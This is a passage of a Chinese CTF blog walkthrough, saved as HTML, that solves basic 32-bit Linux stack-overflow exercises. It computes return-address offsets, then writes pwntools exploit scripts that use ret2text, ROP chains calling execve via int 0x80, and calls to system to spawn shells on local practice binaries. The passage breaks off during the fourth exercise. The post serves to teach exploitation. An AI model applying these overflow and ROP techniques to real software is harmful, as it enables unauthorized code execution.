@@ -1,0 +1,1835 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="raOM80mJci7Yya3KvZl8RZPEXgx2sjibB7giLewBQv4" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Pwn,CTF,ROP," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="TT" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Linux Pwn之前分析过一些MIPS平台下的二进制，对Linux平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。 不说原理，只说思路跟解题方法 一下载题目:pwn 在分析这道题目之前先使用checksec查看一下该程序的保护情况:  checksec pwn1">
+<meta name="keywords" content="Pwn,CTF,ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux PWN">
+<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;2019&#x2F;10&#x2F;28&#x2F;Linux-PWN&#x2F;index.html">
+<meta property="og:site_name" content="TT">
+<meta property="og:description" content="Linux Pwn之前分析过一些MIPS平台下的二进制，对Linux平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。 不说原理，只说思路跟解题方法 一下载题目:pwn 在分析这道题目之前先使用checksec查看一下该程序的保护情况:  checksec pwn1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571474474731.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571474770735.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571475799729.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571476789765.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571476973841.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571477030249.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571477253129.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571477404317.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571478271475.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571496009275.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571497154238.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571551902372.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571552245667.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571496009275.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571553359527.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571553500352.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571554078794.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571554361586.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571554491573.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571554930443.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571555353609.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571555487359.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571556472396.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571556603660.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571556697767.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571557290759.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571558124555.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571558379470.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571558914053.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571559117913.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571559310062.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571559651228.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571560805846.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571561335922.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571561531179.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571571949860.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571572971883.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1572240054879.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1572242662913.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;v2-caa5320d0bb0101edad4b9127f6fe413_hd.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1572270342624.png">
+<meta property="og:updated_time" content="2019-10-28T14:44:25.314Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1571474474731.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.pwntools.xyz/2019/10/28/Linux-PWN/"/>
+
+
+
+
+
+  <title>Linux PWN | TT</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-150349942-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?07ea199d328523d206245b8355f15623";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TT</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/2019/10/28/Linux-PWN/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TT">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TT">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux PWN</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T22:34:38+08:00">
+                2019-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/10/28/Linux-PWN/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/10/28/Linux-PWN/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/10/28/Linux-PWN/" class="leancloud_visitors" data-flag-title="Linux PWN">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><p>之前分析过一些<code>MIPS</code>平台下的二进制，对<code>Linux</code>平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。</p>
+<p>不说原理，只说思路跟解题方法</p>
+<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1" target="_blank" rel="noopener">pwn</a></p>
+<p>在分析这道题目之前先使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener"><code>checksec</code></a>查看一下该程序的保护情况:</p>
+<blockquote>
+<p>checksec pwn1</p>
+</blockquote>
+<a id="more"></a>
+<p><img src="http://file.smilehacker.net/1571474474731.png" alt="checksec pwn1"></p>
+<p>可以看到开启了<code>NX enabled</code>保护。使用<code>IDA</code>查看下程序的代码</p>
+<p><img src="http://file.smilehacker.net/1571474770735.png" alt="IDA加载程序"></p>
+<p>发现程序调用了<code>gets</code>函数，并且没有做任何的处理，可以造成了缓冲区溢出。我们需要分析<code>&amp;s</code>到<code>EBP</code>的距离，因为<code>EBP</code>后存放的就是返回地址。 在32位的程序中，就是<code>ebp+4</code>。<code>Esp -&gt; ebp</code>, 地址从小到大。小地址栈顶，大地址栈底。 </p>
+<h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p>
+<p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p>
+<p>先使用<code>GDB</code>加载程序,在<code>call _gets</code>前下断，然后运行程序，关于<code>GDB</code>的使用参考：<a href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#more">GDB</a></p>
+<pre><code class="shell">pwndbg&gt; disassemble main #查看main函数的汇编代码
+Dump of assembler code for function main:
+   .... #不删掉篇幅太长
+   0x080486ae &lt;+102&gt;:    call   0x8048460 &lt;gets@plt&gt;
+   ....
+End of assembler dump.
+
+pwndbg&gt; b *main+102 #在main函数偏移102行处下断点
+
+Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
+
+pwndbg&gt; r #运行程序
+</code></pre>
+<p>运行结果如下:</p>
+<p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
+<p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p>
+<pre><code class="shell">ESP = 0xffffcfa0
+EBP = 0Xffffd028
+&amp;S = ESP + 1CH = 0xffffcfbc
+
+# &amp;s -&gt; $EBP的距离 offset 
+offset = $EBP - $S = 6C[hex] = 108[DEC]
+
+# func return address
+return address = 108 + 4 = 112</code></pre>
+<h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果:"></a>验证结果:</h3><p>用<code>python</code>生成一段字符，然后输入程序，看出错时结果是不是为我们指定的结果</p>
+<pre><code class="shell"># 在shell下执行
+python -c &quot;print &#39;A&#39;*112 + &#39;BBBB&#39; &quot; &gt; test
+
+# 在GDB中执行
+run &lt; test</code></pre>
+<p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p>
+<p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p>
+<h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p>
+<p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p>
+<p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p>
+<p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p>
+<pre><code class="python">from pwn import *
+
+pwn1 = process(&#39;./pwn1&#39;)
+sh = 0x804863a
+pwn1.sendline(&#39;A&#39; * (112) + p32(sh))
+pwn1.interactive()</code></pre>
+<p>运行后成功拿到<code>shell</code>,第一关很简单.</p>
+<p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p>
+<p><code>cheksec</code>检查保护情况</p>
+<p><img src="http://file.smilehacker.net/1571477404317.png" alt="checksec检查保护"></p>
+<p><code>IDA</code>查看代码</p>
+<p><img src="http://file.smilehacker.net/1571478271475.png" alt="IDA查看代码"></p>
+<p>跟第一关不同的是，这里没有<code>system</code>函数给我们调用了。</p>
+<h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>Linux 的系统调用通过 <code>int 80h</code>实现，用<a href="https://zh.wikipedia.org/w/index.php?title=系统调用号&action=edit&redlink=1" target="_blank" rel="noopener">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p>
+<ul>
+<li><p>应用程序调用库函数<code>（API）</code>；</p>
+</li>
+<li><p><code>API</code> 将系统调用号存入 <code>EAX</code>，然后通过中断调用使系统进入内核态；</p>
+</li>
+<li><p>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p>
+</li>
+<li><p>系统调用完成相应功能，将返回值存入 <code>EAX</code>，返回到中断处理函数；</p>
+</li>
+<li><p>中断处理函数返回到<code>API</code> 中；</p>
+</li>
+<li><p><code>API</code> 将<code>EAX</code>返回给应用程序。</p>
+<p><code>Syscall</code>的函数调用规范为： <code>execve(“/bin/sh”, 0,0)</code></p>
+</li>
+</ul>
+<p>汇编代码如下:</p>
+<pre><code class="shell">pop eax,   # 系统调用号载入， execve为0xb
+pop ebx,     # 第一个参数， /bin/sh的string
+pop ecx,    # 第二个参数，0
+pop edx,   # 第三个参数，0
+int 0x80,   # 执行系统调用</code></pre>
+<p>由于程序内没有<code>system</code>调用，我们需要人为的构造。</p>
+<h3 id="查找ROP链"><a href="#查找ROP链" class="headerlink" title="查找ROP链"></a>查找ROP链</h3><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 查找我们需要的命令。从上面的分析可以知道我们需要对4个寄存器进行操作<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code></p>
+<p>安装好<code>ROPgadget</code>后执行</p>
+<pre><code class="shell"> ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;eax&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ebx&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ecx&quot; 
+ ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;edx&quot; 
+
+ ROPgadget --binary pwn2 --only &#39;int&#39;
+ ROPgadget --binary pwn2 --string &#39;/bin/sh&#39;</code></pre>
+<p>但是在执行寻找<code>ecx</code>之后发现有一条连续<code>pop ecx; pop ebx</code>的指令,我们可以直接用。当然，分开选用两条</p>
+<pre><code class="assembly">pop ebx; ret 
+pop ecx; ret</code></pre>
+<p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p>
+<p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
+<p>寻找系统调用和需要执行命令的字符串</p>
+<p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p>
+<p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p>
+<pre><code class="assembly">eip = [esp];
+
+esp = esp+4;
+
+# 或者
+
+pop eip;</code></pre>
+<p>此时,我们的堆栈布置如下:</p>
+<p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p>
+<p>整个堆栈的调用过程:</p>
+<ol>
+<li>执行<code>gets</code>函数，发生溢出，返回地址被淹没为<code>0x080bb196</code></li>
+<li>跳转到<code>0x080bb196</code>执行代码，取出<code>0xb</code>并返回，栈帧下移到<code>0x0806eb91</code></li>
+<li>跳转到<code>0x0806eb91</code>执行代码，取出<code>0</code>，再从<code>0x080be408</code>处取出<code>/bin/bash</code>，分别存入<code>ecx</code>,<code>edx</code>，返回,栈帧下移到<code>0x0806eb6a</code></li>
+<li>跳转到<code>0x0806eb6a</code>执行代码，取出<code>0</code>存入<code>edx</code>,栈帧下移到<code>0x08049421</code>处</li>
+<li>跳转到<code>0x08049421</code>执行<code>int 0x80</code>中断</li>
+</ol>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+
+sh = process(&quot;./pwn2&quot;)
+pop_eax_ret = 0x080bb196
+pop_ecx_ebx_ret = 0x0806eb91
+pop_edx_ret = 0x0806eb6a
+int_x80 = 0x08049421
+binsh = 0x080be408
+
+payload = flat(
+    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret,0 ,int_x80])
+sh.sendline(payload)
+sh.interactive()
+
+</code></pre>
+<p>执行<code>EXP</code>，成功拿到<code>shell</code></p>
+<p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p>
+<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p>
+<p><img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
+<p>那么此时的栈帧布局就是:</p>
+<p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p>
+<p>写出POC：</p>
+<pre><code class="python">from pwn import *
+
+sh = process(&quot;./pwn2&quot;)
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+pop_edx_ret = 0x0806eb6a
+int_x80 = 0x08049421
+binsh = 0x080be408
+
+payload = flat(
+    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh,int_x80])
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>成功执行:</p>
+<p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p>
+<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p>
+<p><code>checksec</code>检查保护保护状态:</p>
+<p><img src="http://file.smilehacker.net/1571554078794.png" alt="check检查保护状态"></p>
+<p><code>IDA</code>查看汇编代码:</p>
+<p><img src="http://file.smilehacker.net/1571554361586.png" alt="反编译"></p>
+<p>基本跟第二道题目一样，但是我们像第二道题目一样去寻找<code>ROP</code>链的时候发现并没有找到合适的指令</p>
+<p><img src="http://file.smilehacker.net/1571554491573.png" alt="寻找指令失败"></p>
+<p>那也只能尝试其他的方法了,我们在<code>IDA</code>中查看下他的导入函数,发现其中有<code>system</code>函数,那我们直接调用这个函数即可</p>
+<p><img src="http://file.smilehacker.net/1571554930443.png" alt="import导入函数"></p>
+<p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p>
+<p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p>
+<p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p>
+<h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><pre><code class="python">from pwn import *
+
+sh = process(&quot;./pwn3&quot;)
+
+system_addr= 0x08048460
+sh_addr = 0x08048720
+
+payload = flat([&#39;A&#39;*112, system_addr, 0xabcd1122, sh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+<p>这里需要注意, 为什么在<code>system_addr</code>和<code>sh_addr</code>中间会有4字节的空余部分?</p>
+<p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p>
+<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p>
+<p><code>checksec</code>检测程序保护机制</p>
+<p><img src="http://file.smilehacker.net/1571556472396.png" alt="check检测"></p>
+<p>还是一样的，我们再来看程序的导入表:</p>
+<p><img src="http://file.smilehacker.net/1571556603660.png" alt="查看导入表"></p>
+<p>发现是有<code>system</code>函数的，继续通过<code>ROPgadget</code>分析，发现没有<code>/bin/sh</code>字符串.</p>
+<p><img src="http://file.smilehacker.net/1571556697767.png" alt="ROPgadgets分析"></p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在得想个法子。直观的想法是在<code>shellcode</code>中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样： </p>
+<blockquote>
+<p> payload = flat([‘a’ * 112, system_plt, 0xabcdabcd, “/bin/sh”]) </p>
+</blockquote>
+<p>看着可行,但是放在堆栈中的是程序执行的路线图(都是通过指针调用的)，而不是实际的程序或者字符串 。而 ”/bin/sh”对应的4个字节的地址所指向的内存空间明显不合法。但是如果我们可以把<code>/bin/sh</code>塞到一个变量中，然后让<code>system</code>函数去调用他。我们就可以达到目的。可是这个变量哪里找了？我们可以去看<code>ELF</code>程序的<code>bss</code>段，<code>bss</code>段用于存放程序中未经初始化的全局变量和静态局部变量 。很巧，正好有一个。</p>
+<p><img src="http://file.smilehacker.net/1571557290759.png" alt="bss段"></p>
+<p>有了地址之后,一个新的问题产生,我们要怎么把<code>/bin/sh</code>塞到<code>buf2</code>这个变量中? 看看导入函数,那个<code>gets</code> :kissing_heart:</p>
+<h3 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>下面这一段原文作者没有写，都是个人理解，有可能不对，可以看文末的链接</p>
+<p>在写<code>EXP</code>之前,我们需要分析一下我们现在的栈帧应该怎么布置:</p>
+<p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p>
+<p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p>
+<p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p>
+<pre><code class="shell">ROPgadget --binary pwn4 --only &#39;pop|ret&#39;
+</code></pre>
+<p>用第一条第三条都可以。</p>
+<p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p>
+<p>整个运行过程如下:</p>
+<ol>
+<li>程序接收输入,缓冲区溢出,返回地址被淹没成<code>gets</code>函数,并从栈中获取参数</li>
+<li>gets函数执行，将<code>/bin/sh</code>设置到<code>buf2</code>中，gets函数执行完成</li>
+<li>程序去我们设置的<code>gets</code>函数执行完的返回地址中执行<code>pop; ret</code>指令</li>
+<li><code>system</code>函数开始执行</li>
